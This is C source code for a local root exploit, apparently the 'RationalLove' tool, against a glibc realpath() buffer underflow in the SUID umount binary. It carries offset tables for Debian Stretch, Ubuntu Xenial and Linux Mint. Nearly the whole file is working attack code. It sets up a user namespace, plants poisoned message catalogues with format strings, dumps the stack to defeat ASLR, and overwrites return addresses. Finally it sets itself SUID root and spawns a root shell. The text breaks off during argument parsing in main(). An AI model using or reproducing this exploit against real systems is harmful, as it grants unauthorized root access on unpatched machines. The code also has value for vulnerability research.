/** This software is provided by the copyright owner "as is" and any
 *  expressed or implied warranties, including, but not limited to,
 *  the implied warranties of merchantability and fitness for a particular
 *  purpose are disclaimed. In no event shall the copyright owner be
 *  liable for any direct, indirect, incidential, special, exemplary or
 *  consequential damages, including, but not limited to, procurement
 *  of substitute goods or services, loss of use, data or profits or
 *  business interruption, however caused and on any theory of liability,
 *  whether in contract, strict liability, or tort, including negligence
 *  or otherwise, arising in any way out of the use of this software,
 *  even if advised of the possibility of such damage.
 *
 *  Copyright (c) 2018 halfdog <me (%) halfdog.net>
 *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.
 *
 *  This tool exploits a buffer underflow in glibc realpath()
 *  and was tested against latest release from Debian, Ubuntu
 *  Mint. It is intended as demonstration of ASLR-aware exploitation
 *  techniques. It uses relative binary offsets, that may be different
 *  for various Linux distributions and builds. Please send me
 *  a patch when you developed a new set of parameters to add
 *  to the osSpecificExploitDataList structure and want to contribute
 *  them.
 *
 *  Compile: gcc -o RationalLove RationalLove.c
 *  Run: ./RationalLove
 *
 *  You may also use "--Pid" parameter, if you want to test the
 *  program on already existing namespaced or chrooted mounts.
 */

#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <poll.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>


#define UMOUNT_ENV_VAR_COUNT 256

/** Dump that number of bytes from stack to perform anti-ASLR.
 *  This number should be high enough to reproducible reach the
 *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of
 *  environment variable references but low enough to avoid hitting
 *  upper stack limit, which would cause a crash.
 */
#define STACK_LONG_DUMP_BYTES 4096

char *messageCataloguePreamble="Language: en\n"
    "MIME-Version: 1.0\n"
    "Content-Type: text/plain; charset=UTF-8\n"
    "Content-Transfer-Encoding: 8bit\n";

/** The pid of a namespace process with the working directory
 *  at a writable /tmp only visible by the process. */
pid_t namespacedProcessPid=-1;

int killNamespacedProcessFlag=1;

/** The pathname to the umount binary to execute. */
char *umountPathname;

/** The pathname to the named pipe, that will synchronize umount
 *  binary with supervisory process before triggering the second
 *  and last exploitation phase.
 */
char *secondPhaseTriggerPipePathname;

/** The pathname to the second phase exploitation catalogue file.
 *  This is needed as the catalogue cannot be sent via the trigger
 *  pipe from above.
 */
char *secondPhaseCataloguePathname;

/** The OS-release detected via /etc/os-release. */
char *osRelease=NULL;

/** This table contains all relevant information to adapt the
 *  attack to supported Linux distros (fully updated) to support
 *  also older versions, hash of umount/libc/libmount should be
 *  used also for lookups.
 *  The 4th string is an array of 4-byte integers with the offset
 *  values for format string generation. Values specify:
 *  * Stack position (in 8 byte words) for **argv
 *  * Stack position of argv[0]
 *  * Offset from __libc_start_main return position from main()
 *    and system() function, first instruction after last sigprocmask()
 *    before execve call.
 */
#define ED_STACK_OFFSET_CTX 0
#define ED_STACK_OFFSET_ARGV 1
#define ED_STACK_OFFSET_ARG0 2
#define ED_LIBC_GETDATE_DELTA 3
#define ED_LIBC_EXECL_DELTA 4
static char* osSpecificExploitDataList[]={
// Debian Stretch
    "\"9 (stretch)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "from_archive",
// Delta for Debian Stretch "2.24-11+deb9u1"
    "\x06\0\0\0\x24\0\0\0\x3e\0\0\0\x7f\xb9\x08\x00\x4f\x86\x09\x00",
// Ubuntu Xenial libc=2.23-0ubuntu9
    "\"16.04.3 LTS (Xenial Xerus)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "_nl_load_locale_from_archive",
    "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
// Linux Mint 18.3 Sylvia - same parameters as "Ubuntu Xenial"
    "\"18.3 (Sylvia)\"",
    "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
    "_nl_load_locale_from_archive",
    "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00",
    NULL};

char **osReleaseExploitData=NULL;

/** Locate the umount binary within the given search path list,
 *  elements separated by colons.
 *  @return a pointer to a malloced memory region containing the
 *  string or NULL if not found.
 */
char* findUmountBinaryPathname(char *searchPath) {
  char *testPathName=(char*)malloc(PATH_MAX);
  assert(testPathName);

  while(*searchPath) {
    char *endPtr=strchr(searchPath, ':');
    int length=endPtr-searchPath;
    if(!endPtr) {
      length=strlen(searchPath);
      endPtr=searchPath+length-1;
    }
    int result=snprintf(testPathName, PATH_MAX, "%.*s/%s", length,
        searchPath, "umount");
    if(result>=PATH_MAX) {
      fprintf(stderr, "Binary search path element too long, ignoring it.\n");
    } else {
      struct stat statBuf;
      result=stat(testPathName, &statBuf);
// Just assume, that umount is owner-executable. There might be
// alternative ACLs, which grant umount execution only to selected
// groups, but it would be unusual to have different variants
// of umount located searchpath on the same host.
      if((!result)&&(S_ISREG(statBuf.st_mode))&&(statBuf.st_mode&S_IXUSR)) {
        return(testPathName);
      }
    }
    searchPath=endPtr+1;
  }

  free(testPathName);
  return(NULL);
}


/** Get the value for a given field name.
 *  @return NULL if not found, a malloced string otherwise.
 */
char* getReleaseFileField(char *releaseData, int dataLength, char *fieldName) {
  int nameLength=strlen(fieldName);
  while(dataLength>0) {
    char *nextPos=memchr(releaseData, '\n', dataLength);
    int lineLength=dataLength;
    if(nextPos) {
      lineLength=nextPos-releaseData;
      nextPos++;
    } else {
      nextPos=releaseData+dataLength;
    }
    if((!strncmp(releaseData, fieldName, nameLength))&&
        (releaseData[nameLength]=='=')) {
      return(strndup(releaseData+nameLength+1, lineLength-nameLength-1));
    }
    releaseData=nextPos;
    dataLength-=lineLength;
  }
  return(NULL);
}


/** Detect the release by reading the VERSION field from /etc/os-release.
 *  @return 0 on success.
 */
int detectOsRelease() {
  int handle=open("/etc/os-release", O_RDONLY);
  if(handle<0)
    return(-1);

  char *buffer=alloca(1024);
  int infoLength=read(handle, buffer, 1024);
  close(handle);
  if(infoLength<0)
    return(-1);
  osRelease=getReleaseFileField(buffer, infoLength, "VERSION");
  if(!osRelease)
    osRelease=getReleaseFileField(buffer, infoLength, "NAME");
  if(osRelease) {
    fprintf(stderr, "Detected OS version: %s\n", osRelease);
    return(0);
  }

  return(-1);
}


/** Create the catalogue data in memory.
 *  @return a pointer to newly allocated catalogue data memory
 */
char* createMessageCatalogueData(char **origStringList, char **transStringList,
    int stringCount, int *catalogueDataLength) {
  int contentLength=strlen(messageCataloguePreamble)+2;
  for(int stringPos=0; stringPos<stringCount; stringPos++) {
    contentLength+=strlen(origStringList[stringPos])+
        strlen(transStringList[stringPos])+2;
  }
  int preambleLength=(0x1c+0x14*(stringCount+1)+0xc)&-0xf;
  char *catalogueData=(char*)malloc(preambleLength+contentLength);
  memset(catalogueData, 0, preambleLength);
  int *preambleData=(int*)catalogueData;
  *preambleData++=0x950412de;
  preambleData++;
  *preambleData++=stringCount+1;
  *preambleData++=0x1c;
  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;
  *preambleData++=0x5;
  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;

  char *nextCatalogueStringStart=catalogueData+preambleLength;
  for(int stringPos=-1; stringPos<stringCount; stringPos++) {
    char *writeString=(stringPos<0)?"":origStringList[stringPos];
    int length=strlen(writeString);
    *preambleData++=length;
    *preambleData++=(nextCatalogueStringStart-catalogueData);
    memcpy(nextCatalogueStringStart, writeString, length+1);
    nextCatalogueStringStart+=length+1;
  }
  for(int stringPos=-1; stringPos<stringCount; stringPos++) {
    char *writeString=(stringPos<0)?messageCataloguePreamble:transStringList[stringPos];
    int length=strlen(writeString);
    *preambleData++=length;
    *preambleData++=(nextCatalogueStringStart-catalogueData);
    memcpy(nextCatalogueStringStart, writeString, length+1);
    nextCatalogueStringStart+=length+1;
  }
  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);
  for(int stringPos=0; stringPos<=stringCount+1; stringPos++) {
//    *preambleData++=(stringPos+1);
    *preambleData++=(int[]){1, 3, 2, 0, 4}[stringPos];
  }
  *catalogueDataLength=preambleLength+contentLength;
  return(catalogueData);
}


/** Create the catalogue data from the string lists and write
 *  it to the given file.
 *  @return 0 on success.
 */
int writeMessageCatalogue(char *pathName, char **origStringList,
    char **transStringList, int stringCount) {
  int catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, 0644);
  if(catalogueFd<0) {
    fprintf(stderr, "Failed to open catalogue file %s for writing.\n",
        pathName);
    return(-1);
  }
  int catalogueDataLength;
  char *catalogueData=createMessageCatalogueData(
      origStringList, transStringList, stringCount, &catalogueDataLength);
  int result=write(catalogueFd, catalogueData, catalogueDataLength);
  assert(result==catalogueDataLength);
  close(catalogueFd);
  free(catalogueData);
  return(0);
}

void createDirectoryRecursive(char *namespaceMountBaseDir, char *pathName) {
  char pathBuffer[PATH_MAX];
  int pathNameLength=0;
  while(1) {
    char *nextPathSep=strchr(pathName+pathNameLength, '/');
    if(nextPathSep) {
      pathNameLength=nextPathSep-pathName;
    } else {
      pathNameLength=strlen(pathName);
    }
    int result=snprintf(pathBuffer, sizeof(pathBuffer), "%s/%.*s",
        namespaceMountBaseDir, pathNameLength, pathName);
    assert(result<PATH_MAX);
    result=mkdir(pathBuffer, 0755);
    assert((!result)||(errno==EEXIST));
    if(!pathName[pathNameLength])
      break;
    pathNameLength++;
  }
}


/** This child function prepares the namespaced mount point and
 *  then waits to be killed later on.
 */
static int usernsChildFunction() {
  while(geteuid()!=0) {
    sched_yield();
  }
  int result=mount("tmpfs", "/tmp", "tmpfs", MS_MGC_VAL, NULL);
  assert(!result);
  assert(!chdir("/tmp"));
  int handle=open("ready", O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, 0644);
  assert(handle>=0);
  close(handle);
  sleep(100000);
}

/** Prepare a process living in an own mount namespace and setup
 *  the mount structure appropriately. The process is created
 *  in a way allowing cleanup at program end by just killing it,
 *  thus removing the namespace.
 *  @return the pid of that process or -1 on error.
 */
pid_t prepareNamespacedProcess() {
  if(namespacedProcessPid==-1) {
    fprintf(stderr, "No pid supplied via command line, trying to create a namespace\nCAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.\n");

    char *stackData=(char*)malloc(1<<20);
    assert(stackData);
    namespacedProcessPid=clone(usernsChildFunction, stackData+(1<<20),
        CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);
    if(namespacedProcessPid==-1) {
      fprintf(stderr, "USERNS clone failed: %d (%s)\n", errno, strerror(errno));
      return(-1);
    }

    char idMapFileName[128];
    char idMapData[128];
    sprintf(idMapFileName, "/proc/%d/setgroups", namespacedProcessPid);
    int setGroupsFd=open(idMapFileName, O_WRONLY);
    assert(setGroupsFd>=0);
    int result=write(setGroupsFd, "deny", 4);
    assert(result>0);
    close(setGroupsFd);

    sprintf(idMapFileName, "/proc/%d/uid_map", namespacedProcessPid);
    int uidMapFd=open(idMapFileName, O_WRONLY);
    assert(uidMapFd>=0);
    sprintf(idMapData, "0 %d 1\n", getuid());
    result=write(uidMapFd, idMapData, strlen(idMapData));
    assert(result>0);
    close(uidMapFd);

    sprintf(idMapFileName, "/proc/%d/gid_map", namespacedProcessPid);
    int gidMapFd=open(idMapFileName, O_WRONLY);
    assert(gidMapFd>=0);
    sprintf(idMapData, "0 %d 1\n", getgid());
    result=write(gidMapFd, idMapData, strlen(idMapData));
    assert(result>0);
    close(gidMapFd);

// After setting the maps for the child process, the child may
// start setting up the mount point. Wait for that to complete.
    sleep(1);
    fprintf(stderr, "Namespaced filesystem created with pid %d\n",
        namespacedProcessPid);
  }

  osReleaseExploitData=osSpecificExploitDataList;
  if(osRelease) {
// If an OS was detected, try to find it in list. Otherwise use
// default.
    for(int tPos=0; osSpecificExploitDataList[tPos]; tPos+=4) {
      if(!strcmp(osSpecificExploitDataList[tPos], osRelease)) {
        osReleaseExploitData=osSpecificExploitDataList+tPos;
        break;
      }
    }
  }

  char pathBuffer[PATH_MAX];
  int result=snprintf(pathBuffer, sizeof(pathBuffer), "/proc/%d/cwd",
     namespacedProcessPid);
  assert(result<PATH_MAX);
  char *namespaceMountBaseDir=strdup(pathBuffer);
  assert(namespaceMountBaseDir);

// Create directories needed for umount to proceed to final state
// "not mounted".
  createDirectoryRecursive(namespaceMountBaseDir, "(unreachable)/x");
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      "(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES", osReleaseExploitData[2]);
  assert(result<PATH_MAX);
  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      "(unreachable)/tmp/%s/X.X/LC_MESSAGES", osReleaseExploitData[2]);
  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      "(unreachable)/tmp/%s/X.x/LC_MESSAGES", osReleaseExploitData[2]);
  createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);

// Create symlink to trigger underflows.
  result=snprintf(pathBuffer, sizeof(pathBuffer), "%s/(unreachable)/tmp/down",
      namespaceMountBaseDir);
  assert(result<PATH_MAX);
  result=symlink(osReleaseExploitData[1], pathBuffer);
  assert(!result||(errno==EEXIST));

// getdate will leave that string in rdi to become the filename
// to execute for the next round.
  char *selfPathName=realpath("/proc/self/exe", NULL);
  result=snprintf(pathBuffer, sizeof(pathBuffer), "%s/DATEMSK",
      namespaceMountBaseDir);
  assert(result<PATH_MAX);
  int handle=open(pathBuffer, O_WRONLY|O_CREAT|O_TRUNC, 0755);
  assert(handle>0);
  result=snprintf(pathBuffer, sizeof(pathBuffer), "#!%s\nunused",
      selfPathName);
  assert(result<PATH_MAX);
  result=write(handle, pathBuffer, result);
  close(handle);
  free(selfPathName);

// Write the initial message catalogue to trigger stack dumping
// and to make the "umount" call privileged by toggling the "restricted"
// flag in the context.
  result=snprintf(pathBuffer, sizeof(pathBuffer),
      "%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo",
      namespaceMountBaseDir, osReleaseExploitData[2]);
  assert(result<PATH_MAX);

  char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));
  assert(stackDumpStr);
  char *stackDumpStrEnd=stackDumpStr;
  stackDumpStrEnd+=sprintf(stackDumpStrEnd, "AA%%%d$lnAAAAAA",
      ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);
  for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {
    memcpy(stackDumpStrEnd, "%016lx", 6);
    stackDumpStrEnd+=6;
  }
// We wrote allready 8 bytes, write so many more to produce a
// count of 'L' and write that to the stack. As all writes so
// sum up to a count aligned by 8, and 'L'==0x4c, we will have
// to write at least 4 bytes, which is longer than any "%hhx"
// format string output. Hence do not care about the byte content
// here. The target write address has a 16 byte alignment due
// to varg structure.
  stackDumpStrEnd+=sprintf(stackDumpStrEnd, "%%1$%dhhx%%%d$hhn",
      ('L'-8-STACK_LONG_DUMP_BYTES*2)&0xff,
      STACK_LONG_DUMP_BYTES/16);
  *stackDumpStrEnd=0;
  result=writeMessageCatalogue(pathBuffer,
      (char*[]){
          "%s: mountpoint not found",
          "%s: not mounted",
          "%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)"
      },
      (char*[]){"1234", stackDumpStr, "5678"},
      3);
  assert(!result);
  free(stackDumpStr);

  result=snprintf(pathBuffer, sizeof(pathBuffer),
      "%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo",
      namespaceMountBaseDir, osReleaseExploitData[2]);
  assert(result<PATH_MAX);
  result=mknod(pathBuffer, S_IFIFO|0666, S_IFIFO);
  assert((!result)||(errno==EEXIST));
  secondPhaseTriggerPipePathname=strdup(pathBuffer);

  result=snprintf(pathBuffer, sizeof(pathBuffer),
      "%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo",
      namespaceMountBaseDir, osReleaseExploitData[2]);
  secondPhaseCataloguePathname=strdup(pathBuffer);

  free(namespaceMountBaseDir);
  return(namespacedProcessPid);
}



/** Create the format string to write an arbitrary value to the
 *  stack. The created format string avoids to interfere with
 *  the complex fprintf format handling logic by accessing fprintf
 *  internal state on stack. Thus the modification method does
 *  not depend on that ftp internals. The current libc fprintf
 *  implementation copies values for formatting before applying
 *  the %n writes, therefore pointers changed by fprintf operation
 *  can only be utilized with the next fprintf invocation. As
 *  we cannot rely on a stack having a suitable number of pointers
 *  ready for arbitrary writes, we need to create those pointers
 *  one by one. Everything needed is pointer on stack pointing
 *  to another valid pointer and 4 helper pointers pointing to
 *  writeable memory. The **argv list matches all those requirements.
 *  @param printfArgvValuePos the position of the argv pointer from
 *  printf format string view.
 *  @param argvStackAddress the address of the argv list, where
 *  the argv[0] pointer can be read.
 *  @param printfArg0ValuePos the position of argv list containing
 *  argv[0..n] pointers.
 *  @param mainFunctionReturnAddress the address on stack where
 *  the return address from the main() function to _libc_start()
 *  is stored.
 *  @param writeValue the value to write to mainFunctionReturnAddress
 */
void createStackWriteFormatString(
    char *formatBuffer, int bufferSize, int printfArgvValuePos,
    void *argvStackAddress, int printfArg0ValuePos,
    void *mainFunctionReturnAddress, unsigned short *writeData,
    int writeDataLength) {
  int result=0;
  int currentValue=-1;
  for(int nextWriteValue=0; nextWriteValue<0x10000;) {
// Find the lowest value to write.
    nextWriteValue=0x10000;
    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {
       int value=writeData[valuePos];
       if((value>currentValue)&&(value<nextWriteValue))
         nextWriteValue=value;
    }
    if(currentValue<0)
      currentValue=0;
    if(currentValue!=nextWriteValue) {
      result=snprintf(formatBuffer, bufferSize, "%%1$%1$d.%1$ds",
          nextWriteValue-currentValue);
      formatBuffer+=result;
      bufferSize-=result;
      currentValue=nextWriteValue;
    }
    for(int valuePos=0; valuePos<writeDataLength; valuePos++) {
       if(writeData[valuePos]==nextWriteValue) {
          result=snprintf(formatBuffer, bufferSize,
              "%%%d$hn", printfArg0ValuePos+valuePos+1);
          formatBuffer+=result;
          bufferSize-=result;
       }
    }
  }

// Print the return function address location number of bytes
// except 8 (those from the LABEL counter) and write the value
// to arg1.
  int writeCount=((int)mainFunctionReturnAddress-18)&0xffff;
  result=snprintf(formatBuffer, bufferSize,
      "%%1$%d.%ds%%1$s%%1$s%%%d$hn",
      writeCount, writeCount, printfArg0ValuePos);
  formatBuffer+=result;
  bufferSize-=result;

// Write the LABEL 6 more times, thus multiplying the the single
// byte write pointer to an 8-byte aligned argv-list pointer and
// update argv[0] to point to argv[1..n].
  writeCount=(((int)argvStackAddress)-(writeCount+56))&0xffff;
  result=snprintf(formatBuffer, bufferSize,
      "%%1$s%%1$s%%1$s%%1$s%%1$s%%1$s%%1$%d.%ds%%%d$hn",
      writeCount, writeCount, printfArgvValuePos);
  formatBuffer+=result;
  bufferSize-=result;

// Append a debugging preamble.
  result=snprintf(formatBuffer, bufferSize, "-%%35$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%%d$lx-%%78$s\n",
      printfArgvValuePos, printfArg0ValuePos-1, printfArg0ValuePos,
      printfArg0ValuePos+1, printfArg0ValuePos+2, printfArg0ValuePos+3,
      printfArg0ValuePos+4, printfArg0ValuePos+5, printfArg0ValuePos+6);
  formatBuffer+=result;
  bufferSize-=result;
}


/** Wait for the trigger pipe to open. The pipe will be closed
 *  immediately after opening it.
 *  @return 0 when the pipe was opened before hitting a timeout.
 */
int waitForTriggerPipeOpen(char *pipeName) {
  struct timespec startTime, currentTime;
  int result=clock_gettime(CLOCK_MONOTONIC, &startTime);
  startTime.tv_sec+=10;
  assert(!result);
  while(1) {
    int pipeFd=open(pipeName, O_WRONLY|O_NONBLOCK);
    if(pipeFd>=0) {
      close(pipeFd);
      break;
    }
    result=clock_gettime(CLOCK_MONOTONIC, &currentTime);
    if(currentTime.tv_sec>startTime.tv_sec) {
      return(-1);
    }
    currentTime.tv_sec=0;
    currentTime.tv_nsec=100000000;
    nanosleep(&currentTime, NULL);
  }
  return(0);
}


/** Invoke umount to gain root privileges.
 *  @return 0 if the umount process terminated with expected exit
 *  status.
 */
int attemptEscalation() {
  int escalationSuccess=-1;

  char targetCwd[64];
  snprintf(
      targetCwd, sizeof(targetCwd)-1, "/proc/%d/cwd", namespacedProcessPid);

  int pipeFds[2];
  int result=pipe(pipeFds);
  assert(!result);

  pid_t childPid=fork();
  assert(childPid>=0);
  if(!childPid) {
// This is the child process.
    close(pipeFds[0]);
    fprintf(stderr, "Starting subprocess\n");
    dup2(pipeFds[1], 1);
    dup2(pipeFds[1], 2);
    close(pipeFds[1]);
    result=chdir(targetCwd);
    assert(!result);

// Create so many environment variables for a kind of "stack spraying".
    int envCount=UMOUNT_ENV_VAR_COUNT;
    char **umountEnv=(char**)malloc((envCount+1)*sizeof(char*));
    assert(umountEnv);
    umountEnv[envCount--]=NULL;
    umountEnv[envCount--]="LC_ALL=C.UTF-8";
    while(envCount>=0) {
      umountEnv[envCount--]="AANGUAGE=X.X";
    }
// Use the built-in C locale.
// Invoke umount first by overwriting heap downwards using links
// for "down", then retriggering another error message ("busy")
// with hopefully similar same stack layout for other path "/".
    char* umountArgs[]={umountPathname, "/", "/", "/", "/", "/", "/", "/", "/", "/", "/", "down", "LABEL=78", "LABEL=789", "LABEL=789a", "LABEL=789ab", "LABEL=789abc", "LABEL=789abcd", "LABEL=789abcde", "LABEL=789abcdef", "LABEL=789abcdef0", "LABEL=789abcdef0", NULL};
    result=execve(umountArgs[0], umountArgs, umountEnv);
    assert(!result);
  }
  close(pipeFds[1]);
  int childStdout=pipeFds[0];

  int escalationPhase=0;
  char readBuffer[1024];
  int readDataLength=0;
  char stackData[STACK_LONG_DUMP_BYTES];
  int stackDataBytes=0;

  struct pollfd pollFdList[1];
  pollFdList[0].fd=childStdout;
  pollFdList[0].events=POLLIN;

// Now learn about the binary, prepare data for second exploitation
// phase. The phases should be:
// * 0: umount executes, glibc underflows and causes an util-linux.mo
//   file to be read, that contains a poisonous format string.
//   Successful poisoning results in writing of 8*'A' preamble,
//   we are looking for to indicate end of this phase.
// * 1: The poisoned process writes out stack content to defeat
//   ASLR. Reading all relevant stack end this phase.
// * 2: The poisoned process changes the "LANGUAGE" parameter,
//   thus triggering re-read of util-linux.mo. To avoid races,
//   we let umount open a named pipe, thus blocking execution.
//   As soon as the pipe is ready for writing, we write a modified
//   version of util-linux.mo to another file because the pipe
//   cannot be used for sending the content.
// * 3: We read umount output to avoid blocking the process and
//   wait for it to ROP execute fchown/fchmod and exit.
  while(1) {
    if(escalationPhase==2) {
// We cannot use the standard poll from below to monitor the pipe,
// but also we do not want to block forever. Wait for the pipe
// in nonblocking mode and then continue with next phase.
      result=waitForTriggerPipeOpen(secondPhaseTriggerPipePathname);
      if(result) {
        goto attemptEscalationCleanup;
      }
      escalationPhase++;
    }

// Wait at most 10 seconds for IO.
    result=poll(pollFdList, 1, 10000);
    if(!result) {
// We ran into a timeout. This might be the result of a deadlocked
// child, so kill the child and retry.
      fprintf(stderr, "Poll timed out\n");
      goto attemptEscalationCleanup;
    }
// Perform the IO operations without blocking.
    if(pollFdList[0].revents&(POLLIN|POLLHUP)) {
      result=read(
          pollFdList[0].fd, readBuffer+readDataLength,
          sizeof(readBuffer)-readDataLength);
      if(!result) {
        if(escalationPhase<3) {
// Child has closed the socket unexpectedly.
          goto attemptEscalationCleanup;
        }
        break;
      }
      if(result<0) {
        fprintf(stderr, "IO error talking to child\n");
        goto attemptEscalationCleanup;
      }
      readDataLength+=result;

// Handle the data depending on escalation phase.
      int moveLength=0;
      switch(escalationPhase) {
        case 0: // Initial sync: read A*8 preamble.
          if(readDataLength<8)
            continue;
          char *preambleStart=memmem(readBuffer, readDataLength,
              "AAAAAAAA", 8);
          if(!preambleStart) {
// No preamble, move content only if buffer is full.
            if(readDataLength==sizeof(readBuffer))
              moveLength=readDataLength-7;
            break;
          }
// We found, what we are looking for. Start reading the stack.
          escalationPhase++;
          moveLength=preambleStart-readBuffer+8;
        case 1: // Read the stack.
// Consume stack data until or local array is full.
          while(moveLength+16<=readDataLength) {
            result=sscanf(readBuffer+moveLength, "%016lx",
                (int*)(stackData+stackDataBytes));
            if(result!=1) {
// Scanning failed, the data injection procedure apparently did
// not work, so this escalation failed.
              goto attemptEscalationCleanup;
            }
            moveLength+=sizeof(long)*2;
            stackDataBytes+=sizeof(long);
// See if we reached end of stack dump already.
            if(stackDataBytes==sizeof(stackData))
              break;
          }
          if(stackDataBytes!=sizeof(stackData))
            break;

// All data read, use it to prepare the content for the next phase.
          fprintf(stderr, "Stack content received, calculating next phase\n");

          int *exploitOffsets=(int*)osReleaseExploitData[3];

// This is the address, where source Pointer is pointing to.
          void *sourcePointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]];
// This is the stack address source for the target pointer.
          void *sourcePointerLocation=sourcePointerTarget-0xd0;

          void *targetPointerTarget=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARG0]];
// This is the stack address of the libc start function return
// pointer.
          void *libcStartFunctionReturnAddressSource=sourcePointerLocation-0x10;
          fprintf(stderr, "Found source address location %p pointing to target address %p with value %p, libc offset is %p\n",
              sourcePointerLocation, sourcePointerTarget,
              targetPointerTarget, libcStartFunctionReturnAddressSource);
// So the libcStartFunctionReturnAddressSource is the lowest address
// to manipulate, targetPointerTarget+...

          void *libcStartFunctionAddress=((void**)stackData)[exploitOffsets[ED_STACK_OFFSET_ARGV]-2];
          void *stackWriteData[]={
              libcStartFunctionAddress+exploitOffsets[ED_LIBC_GETDATE_DELTA],
              libcStartFunctionAddress+exploitOffsets[ED_LIBC_EXECL_DELTA]
          };
          fprintf(stderr, "Changing return address from %p to %p, %p\n",
              libcStartFunctionAddress, stackWriteData[0],
              stackWriteData[1]);
          escalationPhase++;

          char *escalationString=(char*)malloc(1024);
          createStackWriteFormatString(
              escalationString, 1024,
              exploitOffsets[ED_STACK_OFFSET_ARGV]+1, // Stack position of argv pointer argument for fprintf
              sourcePointerTarget, // Base value to write
              exploitOffsets[ED_STACK_OFFSET_ARG0]+1, // Stack position of argv[0] pointer ...
              libcStartFunctionReturnAddressSource,
              (unsigned short*)stackWriteData,
              sizeof(stackWriteData)/sizeof(unsigned short)
          );
          fprintf(stderr, "Using escalation string %s", escalationString);

          result=writeMessageCatalogue(
              secondPhaseCataloguePathname,
              (char*[]){
                  "%s: mountpoint not found",
                  "%s: not mounted",
                  "%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)"
              },
              (char*[]){
                  escalationString,
                  "BBBB5678%3$s\n",
                  "BBBBABCD%s\n"},
              3);
          assert(!result);
          break;
        case 2:
        case 3:
// Wait for pipe connection and output any result from mount.
          readDataLength=0;
          break;
        default:
          fprintf(stderr, "Logic error, state %d\n", escalationPhase);
          goto attemptEscalationCleanup;
      }
      if(moveLength) {
        memmove(readBuffer, readBuffer+moveLength, readDataLength-moveLength);
        readDataLength-=moveLength;
      }
    }
  }

attemptEscalationCleanup:
// Wait some time to avoid killing umount even when exploit was
// successful.
  sleep(1);
  close(childStdout);
// It is safe to kill the child as we did not wait for it to finish
// yet, so at least the zombie process is still here.
  kill(childPid, SIGKILL);
  pid_t waitedPid=waitpid(childPid, NULL, 0);
  assert(waitedPid==childPid);

  return(escalationSuccess);
}


/** This function invokes the shell specified via environment
 *  or the default shell "/bin/sh" when undefined. The function
 *  does not return on success.
 *  @return -1 on error
 */
int invokeShell(char *shellName) {
  if(!shellName)
    shellName=getenv("SHELL");
  if(!shellName)
    shellName="/bin/sh";
  char* shellArgs[]={shellName, NULL};
  execve(shellName, shellArgs, environ);
  fprintf(stderr, "Failed to launch shell %s\n", shellName);
  return(-1);
}

int main(int argc, char **argv) {
  char *programmName=argv[0];
  int exitStatus=1;

  if(getuid()==0) {
    fprintf(stderr, "%s: you are already root, invoking shell ...\n",
        programmName);
    invokeShell(NULL);
    return(1);
  }

  if(geteuid()==0) {
    struct stat statBuf;
    int result=stat("/proc/self/exe", &statBuf);
    assert(!result);
    if(statBuf.st_uid||statBuf.st_gid) {
      fprintf(stderr, "%s: internal invocation, setting SUID mode\n",
          programmName);
      int handle=open("/proc/self/exe", O_RDONLY);
      fchown(handle, 0, 0);
      fchmod(handle, 04755);
      exit(0);
    }

    fprintf(stderr, "%s: invoked as SUID, invoking shell ...\n",
        programmName);
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    invokeShell(NULL);
    return(1);
  }

  for(int argPos=1; argPos<argc;) {
    char *argName=argv[argPos++];
    if(argPos==argc) {
      fprintf(stderr, "%s requires parameter\n", argName);
      return(1);
    }
    if(!strcmp("--Pid", argName)) {
      char *endPtr;
      namespacedProcessPid=strtoll(argv[argPos++], &endPtr, 10);
      if((errno)||(*endPtr)) {
